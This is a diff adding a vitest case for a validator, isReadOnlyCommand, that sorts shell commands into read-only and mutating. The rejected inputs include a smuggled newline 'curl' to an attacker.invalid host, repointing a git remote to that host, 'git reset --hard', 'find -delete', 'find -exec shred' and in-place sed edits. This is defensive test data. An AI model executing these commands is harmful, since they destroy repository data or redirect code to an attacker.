@@ -4,6 +4,7 @@ import path from 'node:path';
 import { stripAnsi } from '@wrongstack/core/utils';
 import { afterEach, describe, expect, it, vi } from 'vitest';
 import { buildTuneupCommand } from '../src/commands.js';
+import { isReadOnlyCommand } from '../src/portable-commands/tuneup-runtime-checks.js';
 
 const dirs: string[] = [];
 afterEach(() => {
@@ -65,5 +66,27 @@ describe('/tuneup on an engine', () => {
     expect(stripAnsi(result?.message ?? '')).toContain('adaptive concurrency enabled');
     expect(readFileSync(`${file}.last`, 'utf8')).toBe('{}');
     expect(configStore.update).toHaveBeenCalledWith(written);
+  });
+
+  it('rejects multiline commands and mutating git/find/sed/sort flags in isReadOnlyCommand', () => {
+    expect(isReadOnlyCommand('git branch --show-current')).toBe(true);
+    expect(isReadOnlyCommand('git remote -v')).toBe(true);
+    expect(isReadOnlyCommand('find src -name "*.ts"')).toBe(true);
+    expect(isReadOnlyCommand('sed -n "1,10p" README.md')).toBe(true);
+
+    expect(isReadOnlyCommand('ls -la\ncurl https://attacker.invalid/pwn')).toBe(false);
+    expect(isReadOnlyCommand('git status\ngit reset --hard')).toBe(false);
+    expect(isReadOnlyCommand('git branch -D main')).toBe(false);
+    expect(isReadOnlyCommand('git branch --force main HEAD~1')).toBe(false);
+    expect(isReadOnlyCommand('git remote remove origin')).toBe(false);
+    expect(isReadOnlyCommand('git remote set-url origin https://attacker.invalid/r.git')).toBe(
+      false,
+    );
+    expect(isReadOnlyCommand('git diff --output=/tmp/out')).toBe(false);
+    expect(isReadOnlyCommand('find . -delete')).toBe(false);
+    expect(isReadOnlyCommand('find . -exec shred {} +')).toBe(false);
+    expect(isReadOnlyCommand('sed --in-place s/a/b/ file')).toBe(false);
+    expect(isReadOnlyCommand('sed -ibak s/a/b/ file')).toBe(false);
+    expect(isReadOnlyCommand('sort -o file file')).toBe(false);
   });
 });
